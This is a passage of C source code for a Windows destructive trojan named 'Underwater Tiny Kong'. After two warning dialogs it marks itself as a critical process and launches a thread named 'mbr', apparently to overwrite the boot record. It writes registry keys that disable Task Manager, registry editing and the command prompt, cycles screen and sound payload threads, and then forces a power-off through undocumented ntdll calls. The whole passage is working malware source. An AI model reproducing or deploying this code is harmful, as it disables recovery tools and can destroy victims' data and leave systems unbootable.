			TerminateThread(thread10, 0);
			CloseHandle(thread10);
		}
		if (count == 5) {
			HANDLE thread11 = CreateThread(0, 0, up1, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread11dot1, 0);
			CloseHandle(thread11dot1);
		}
		if (count == 4) {
			HANDLE thread12 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, sines, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
		}
		if (count == 3) {
			HANDLE thread13 = CreateThread(0, 0, merge, 0, 0, 0);
			HANDLE thread13dot1 = CreateThread(0, 0, asterisk, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread13dot1, 0);
			CloseHandle(thread13dot1);
		}
		if (count == 2) {
			HANDLE thread14 = CreateThread(0, 0, sines1, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, lines, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread14dot1, 0);
			CloseHandle(thread14dot1);
		}
		if (count == 1) {
			HANDLE thread15 = CreateThread(0, 0, omg, 0, 0, 0);
			HANDLE thread15dot1 = CreateThread(0, 0, shuffle, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			TerminateThread(thread15dot1, 0);
			CloseHandle(thread15dot1);
		}
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
	}
}

int CALLBACK WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a randomized trojan known as Underwater Tiny Kong that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator (Underwater Tiny Kong & CoderLinjian) will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"!!!!!! WARNING HELL COMING !!!!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This randomized trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator (Underwater Tiny Kong & CoderLinjian) will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"Final Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			CreateThread(0, 0, taskbar, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(3000);
			CreateThread(0, 0, aerror, 0, 0, 0);
			Sleep(1000);
			HANDLE thread0 = CreateThread(0, 0, logo, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, textz, 0, 0, 0);
			CreateThread(0, 0, cur, 0, 0, 0);
			CreateThread(0, 0, opener, 0, 0, 0);
			HANDLE audios = CreateThread(0, 0, sound, 0, 0, 0);
			HANDLE effects = CreateThread(0, 0, payload, 0, 0, 0);
			Sleep(301000);
			TerminateThread(effects, 0);
			CloseHandle(effects);
			typedef ULONG32(WINAPI* lpNtShutdownSystem)(int Action);
			typedef ULONG32(WINAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			PVOID Info;
			HMODULE hModule;
			lpNtSetSystemPowerState NtSetSystemPowerState;
			lpNtShutdownSystem NtShutdownSystem;

			//Load ntdll.dll
			if ((hModule = LoadLibrary(_T("ntdll.dll"))) == 0) {
				return 1;
			}

			//Get functions
			NtShutdownSystem = (lpNtShutdownSystem)GetProcAddress(hModule, "NtShutdownSystem");
			if (NtShutdownSystem == NULL) {
				return 2;
			}
			NtSetSystemPowerState = (lpNtSetSystemPowerState)GetProcAddress(hModule, "NtSetSystemPowerState");
			if (NtSetSystemPowerState == NULL) {
				return 3;
			}

			// Get a token for this process
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
				return(FALSE);

			// Get the LUID for the shutdown privilege
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;  // one privilege to set	
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			// Get the shutdown privilege for this process. 
			AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			if (GetLastError() != ERROR_SUCCESS) {
				return 4;
			}

			/*
			* Technically only NtSetSystemPowerState is needed to be called to power off a computer
			* Howver, I found at least one report of NtSetSystemPowerState not working while NtShutdownSystem does
			* https://www.autoitscript.com/forum/topic/149641-how-to-force-a-power-down/page/2/?tab=comments#comment-1166299
			* So the code calls NtSetSystemPowerState first, since in my tests it's a hair faster, and if that fails will call NtShutdownSystem as a fallback
			*/
			ULONG32 retNSSPS = NtSetSystemPowerState((POWER_ACTION)PowerSystemShutdown, (SYSTEM_POWER_STATE)PowerActionShutdown, 0);
			ULONG32 retNSS = NtShutdownSystem(2); //2 = ShutdownPowerOff
			Sleep(-1);
		}
	}
}